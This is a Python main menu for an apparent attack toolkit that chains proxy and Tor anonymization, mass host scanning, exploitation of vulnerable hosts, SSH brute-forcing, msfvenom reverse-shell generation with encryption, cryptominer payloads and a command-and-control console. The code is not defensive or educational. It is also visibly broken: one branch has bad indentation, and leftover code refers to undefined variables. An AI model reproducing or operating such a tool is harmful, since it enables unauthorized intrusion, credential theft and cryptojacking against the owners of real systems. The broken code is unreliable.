from globals import (
    global_hosts,
    global_live_hosts,
    global_vulnerable_hosts,
    global_scraped_proxies,
    global_tested_proxies,
    global_active_sessions,
    global_config,
    global_generated_payloads,
    global_error_log,
    global_scan_stats,
    global_wordlist_paths,
    pause_event,
    stop_event,
)
from modules.proxy_handler import (
    load_proxies,
    test_proxies,
    scrape_proxies,
    add_proxy_sources,
    load_checked_proxies,
    clear_proxies,
)
from modules.host_handler import (
    load_hosts,
    load_ip_ranges,
    test_hosts,
    load_previous_hosts,
)
from modules.scanner import scan_hosts, show_results, clear_results
from modules.exploit import identify_vulnerable_hosts, exploit_vulnerable_hosts
from modules.utils import clear_all_chunks, split_large_csvs, ensure_wordlists, ensure_valid_hosts
from modules.bruteforce import load_wordlists, bruteforce_ssh
from modules.config_handler import configure_settings
from modules.shell_generator import generate_msfvenom_shell, encrypt_generated_shell, list_payloads
from modules.miner_payload import encrypt_all_cryptominers, list_cryptominers
from modules.command_control import start_listener, c2_interface, start_apache_server, stop_listeners
from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
import os
import keyboard
from modules.go_bruteforce import run_golang_bruteforce
import threading
from termcolor import colored
import time

# Dictionary to track active background tasks
active_tasks = {}

# Proxy & Host scanning counters
proxy_stats = {"total": 0, "testing": 0, "valid": 0, "dead": 0, "remaining": 0}
host_stats = {"total": 0, "scanning": 0, "valid": 0, "dead": 0, "remaining": 0}
brute_stats = {"running": 0, "success": 0, "failed": 0}

def stop_all_background_tasks():
    """
    Gracefully stop all running background tasks.
    """
    print("[INFO] Stopping all background tasks...")
    for task_name, thread in active_tasks.items():
        if thread.is_alive():
            print(f"[INFO] Stopping {task_name}...")
            stop_event.set()  # Signal all running scans to stop
            thread.join()

def toggle_background_task(task_name, function, *args):
    """
    Manage background tasks:
    - Start new task if not running
    - Resume existing task if already running
    - Stop task if user requests

    :param task_name: Unique name for the background task
    :param function: Function to execute
    :param args: Arguments to pass to the function
    """
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        print(f"[INFO] Resuming {task_name}...")
        active_tasks[task_name].join()  # Bring user back to running scan
    else:
        print(f"[INFO] Starting {task_name} in background...")
        thread = threading.Thread(target=function, args=args, daemon=True)
        active_tasks[task_name] = thread
        thread.start()
def status_text(task_name):
    """
    Display 'CURRENTLY RUNNING' status in green for active tasks.
    """
    if task_name in active_tasks and active_tasks[task_name].is_alive():
        return colored("[CURRENTLY RUNNING]", "green")
    return ""        

def main_menu():
    while True:
        # Clear screen
        print("\033[H\033[J", end="")

        # ** Display Current Statistics ** #
        display_statistics()

        # ** Main Menu ** #
        print(r"#################################################")
        print(r" _____  ______   _____  ______   _____   _____   ")
        print(r"|_   _| | ___ \ |_   _| | ___ \ |  _  | |  ___|  ")
        print(r"  | |   | |_/ /   | |   | |_/ / | | | | |___ \   ")
        print(r"  | |   |    /    | |   |  __/  | | | |     \ \  ")
        print(r"  | |   | |\ \   _| |_  | |     \ \_/ / /\__/ /  ")
        print(r"  \_/   \_| \_|  \___/  \_|      \___/  \____/   ")
        print(r"#################################################")
        print(r"#################################################")
        print(r" _____  _____   ___   _   _  _   _  _____ ______ ")
        print(r"/  ___|/  __ \\ / _ \\ | \\ | || \\ | ||  ___|| ___ \\")
        print(r"\\ `--. | /  \\// /_\\ \\|  \\| ||  \\| || |__  | |_/ /")
        print(r" `--. \\| |    |  _  || . ` || . ` ||  __| |    / ")
        print(r"/\\__/ /| \\__/\\| | | || |\\  || |\\  || |___ | |\\ \\ ")
        print(r"\\____/  \\____/\\_| |_/\\_| \\_/\\_| \\_/\\____/ \\_| \\_|")
        print(r"#################################################")
        print(r"#################################################")                                          
        print(r"#################################################")
        print("\n[ Main Menu ]")
        print(f"1.) Add Proxy Sources")
        print(f"2.) Scrape Proxies")
        print(f"3.) Load Proxies")
        print(f"4.) Test Proxies {status_text('proxy_test')}")
        print(f"5.) Load Checked Proxies")
        print(f"6.) Clear Proxies")
        print(f"7.) Load Hosts")
        print(f"8.) Load IP Ranges")
        print(f"9.) Load Previously Tested Hosts")
        print(f"10.) Test Hosts {status_text('host_test')}")
        print(f"11.) Scan Hosts {status_text('host_scan')}")
        print(f"12.) Show Results")
        print(f"13.) Clear Results")
        print(f"14.) Identify Vulnerabilities")
        print(f"15.) Exploit Vulnerable Hosts")
        print(f"16.) Clear All Chunks")
        print(f"17.) Split Large CSVs")
        print(f"18.) Python SSH Bruteforce {status_text('python_brute')}")
        print(f"19.) Golang SSH Bruteforce (w/ SOCKS5) {status_text('go_brute')}")
        print(f"20.) Configuration Settings")
        print(f"21.) Generate Reverse Shell")
        print(f"22.) Manage Cryptominers")
        print(f"23.) Command and Control Center")
        print(f"24.) Start/Stop Tor Proxy")
        print(f"25.) Exit")
        print(r"#################################################")      

        choice = input("Enter your choice: ")
        if choice == "1":
            add_proxy_sources()
        elif choice == "2":
            scrape_proxies()
        elif choice == "3":
            global_scraped_proxies[:] = load_proxies()
          if choice == "4":
            toggle_background_task("proxy_test", test_proxies, global_scraped_proxies)
        elif choice == "5":
            global_tested_proxies[:] = load_checked_proxies()
        elif choice == "6":
            clear_proxies()
        elif choice == "7":
            global_hosts[:] = load_hosts()
        elif choice == "8":
            global_hosts[:] = load_ip_ranges()
        elif choice == "9":
            global_hosts[:] = load_previous_hosts()
        elif choice == "10":
            toggle_background_task("host_test", test_hosts, global_hosts, global_tested_proxies)
        elif choice == "11":
            toggle_background_task("host_scan", scan_hosts)
        elif choice == "12":
            show_results()
        elif choice == "13":
            clear_results()
        elif choice == "14":
            global_vulnerable_hosts[:] = identify_vulnerable_hosts(global_live_hosts)
        elif choice == "15":
            exploit_vulnerable_hosts(global_vulnerable_hosts)
        elif choice == "16":
            clear_all_chunks()
        elif choice == "17":
            base_dir = "ip_ranges"
            max_lines = input("Enter the maximum number of lines per chunk (default 200): ")
            try:
                max_lines = int(max_lines) if max_lines else 200
            except ValueError:
                max_lines = 200
            split_large_csvs(base_dir, max_lines)
        elif choice == "18":
            toggle_background_task("python_brute", bruteforce_ssh, global_live_hosts)
             if not usernames or not passwords:
                 print("[ERROR] Missing or empty wordlists.")
                 continue

            print("\n[ SSH Bruteforce Options ]")
            print("1.) Python-Based Brute Force (Hydra/Paramiko)")
            print("2.) Golang-Based Brute Force (SOCKS5 + Tor)")
            print("3.) Return to Main Menu")

            bruteforce_choice = input("Enter your choice: ")

            if bruteforce_choice == "1":
                bruteforce_ssh(targets, usernames, passwords, max_threads=5)
            elif bruteforce_choice == "2":
                run_golang_bruteforce(global_live_hosts, "wordlists/ssh_usernames.txt", "wordlists/ssh_passwords.txt", 5)
            elif bruteforce_choice == "3":
                continue
            else:
                print("[ERROR] Invalid choice. Please enter 1, 2, or 3.")
        elif choice == "19":
            toggle_background_task("go_brute", run_golang_bruteforce, global_live_hosts)
        elif choice == "20":
            configure_settings()
        elif choice == "21":
            payloads = list_payloads()
            if not payloads:
                continue
            try:
                payload_choice = int(input("Select a payload by number: ")) - 1
                if payload_choice < 0 or payload_choice >= len(payloads):
                    print("[ERROR] Invalid choice.")
                    continue
                payload = payloads[payload_choice]
            except ValueError:
                print("[ERROR] Invalid input.")
                continue
            lhost = input("Enter the LHOST: ").strip()
            lport = input("Enter the LPORT: ").strip()
            output_format = input("Enter the output format (e.g., exe, elf): ").strip()
            output_name = input("Enter the output file name: ").strip()
            shell_path = generate_msfvenom_shell(payload, lhost, lport, output_format, output_name)
            if shell_path:
                encrypt_choice = input("Encrypt the shell? (yes/no): ").strip().lower()
                if encrypt_choice == "yes":
                    encrypt_generated_shell(shell_path)
        elif choice == "22":
            list_cryptominers()
        elif choice == "23":
            c2_interface()
        elif choice == "24":
            tor_action = input("[INFO] Start Tor (1), Stop Tor (2), Renew Tor IP (3): ")
            if tor_action == "1":
                start_tor()
            elif tor_action == "2":
                stop_tor()
            elif tor_action == "3":
                renew_tor_ip()
        elif choice == "25":
            stop_all_background_tasks()
            break

def setup_keyboard_controls():
    keyboard.add_hotkey("F5", lambda: pause_event.set() if not pause_event.is_set() else pause_event.clear())
    keyboard.add_hotkey("F6", lambda: stop_event.set())
    print("[INFO] Press F5 to pause/resume and F6 to stop scanning.")

setup_keyboard_controls()

if __name__ == "__main__":
    main_menu()
